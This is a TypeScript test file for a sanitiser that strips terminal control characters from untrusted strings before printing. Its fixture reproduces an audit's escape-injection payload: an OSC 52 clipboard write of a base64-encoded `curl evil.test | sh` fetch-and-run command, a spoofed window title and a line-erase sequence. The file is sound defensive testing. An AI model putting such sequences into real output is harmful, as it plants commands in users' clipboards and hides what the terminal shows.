/**
 * `clip.ts`: somebody else's words, made safe for the terminal of the person running the command.
 *
 * THE CASES ARE THE AUDIT'S BYTES, NOT INVENTED ONES. Audit thirty-seven finding 3 measured a `set_var` answer carrying
 * OSC 52 (a clipboard write of `curl evil.test | sh`), OSC 0 (a window title) and CR plus CSI 2K (erase the line) all the
 * way to `automations show`'s output. The eight-bit spellings are here because the copies this module replaced in
 * `brief.ts` and `session.ts` stopped at U+001F and let U+009B and U+009D through, measured by running this file against
 * their regex before the module existed.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { clip, oneLine, printable } from '../src/clip.ts';

const HOSTILE = 'Invoice 7\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b]0;BrainDog: all clear\u0007\r\u001b[2K';
const SHOWN = 'Invoice 7 ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== ]0;BrainDog: all clear [2K';

/** Every control character a printed line could carry, C0, DEL and C1 alike. */
const CONTROL = /[\u0000-\u001f\u007f-\u009f]/;

test('oneLine: the audit row loses every ESC, BEL and CR, and keeps every printable character where it was', () => {
  assert.equal(oneLine(HOSTILE), SHOWN);
  assert.equal(CONTROL.test(oneLine(HOSTILE)), false);
});

test('oneLine: the eight-bit CSI and OSC, and DEL, go the same way as the seven-bit ones', () => {
  assert.equal(oneLine('acme\u009b2K'), 'acme 2K');
  assert.equal(oneLine('acme\u009d0;title\u009c'), 'acme 0;title');
  assert.equal(oneLine('a\u007fb'), 'a b');
});

test('oneLine: a note written over several lines reads as one, and words that were never hostile are left alone', () => {
  assert.equal(oneLine('  First line.\n\tSecond line.\r\n'), 'First line. Second line.');
  /* ACCENTS AND ARABIC ARE ABOVE U+009F, so a name written in either survives the scrub byte for byte. */
  assert.equal(oneLine('Café Sanad مرحبا'), 'Café Sanad مرحبا');
});

test('clip: cuts after the scrub, so an escape sequence cannot spend the characters a person was meant to read', () => {
  assert.equal(clip(HOSTILE, 200), SHOWN);
  assert.equal(clip(HOSTILE, 12), 'Invoice 7...');
  assert.equal(clip('short', 12), 'short');
});

test('printable: every string at any depth is one clean line, and numbers, booleans and nulls are kept as they are', () => {
  const kept = { name: HOSTILE, version: 3, enabled: false, next: null, runs: [{ say: HOSTILE, steps: [{ answer: 'a\nb' }] }], reads: [HOSTILE] };
  const before = structuredClone(kept);
  assert.deepEqual(printable(kept), { name: SHOWN, version: 3, enabled: false, next: null, runs: [{ say: SHOWN, steps: [{ answer: 'a b' }] }], reads: [SHOWN] });
  /* A COPY, NEVER THE VALUE ITSELF: the same object is what `--json` hands an agent, bytes and all. */
  assert.deepEqual(kept, before);
});
